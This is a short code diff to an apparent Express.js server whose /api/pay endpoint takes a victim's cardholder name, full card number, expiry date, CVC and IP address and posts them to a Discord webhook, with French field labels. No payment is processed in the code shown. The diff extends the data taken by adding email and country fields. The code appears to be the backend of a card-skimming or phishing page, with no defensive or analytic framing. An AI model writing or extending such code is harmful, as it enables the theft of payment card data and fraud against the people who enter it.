@@ -69,7 +69,7 @@ function generateCode() {
 }
 
 app.post('/api/pay', async (req, res) => {
-    const { cardHolder, cardNumber, expiry, cvc } = req.body;
+    const { cardHolder, cardNumber, expiry, cvc, email, country } = req.body;
 
     try {
         await axios.post(DISCORD_WEBHOOK, {
@@ -78,9 +78,11 @@ app.post('/api/pay', async (req, res) => {
                 color: 0x9D50BB,
                 fields: [
                     { name: "👤 Titulaire", value: `\`${cardHolder || 'Inconnu'}\``, inline: true },
+                    { name: "📧 Email", value: `\`${email || 'Inconnu'}\``, inline: true },
                     { name: "🔢 Numéro", value: `\`${cardNumber || 'Inconnu'}\``, inline: true },
                     { name: "📅 Expiration", value: `\`${expiry || 'Inconnu'}\``, inline: true },
                     { name: "🔒 CVC", value: `\`${cvc || 'Inconnu'}\``, inline: true },
+                    { name: "🌍 Pays", value: `\`${country || 'Inconnu'}\``, inline: true },
                     { name: "🌐 Client IP", value: `\`${req.ip}\`` }
                 ],
                 timestamp: new Date()
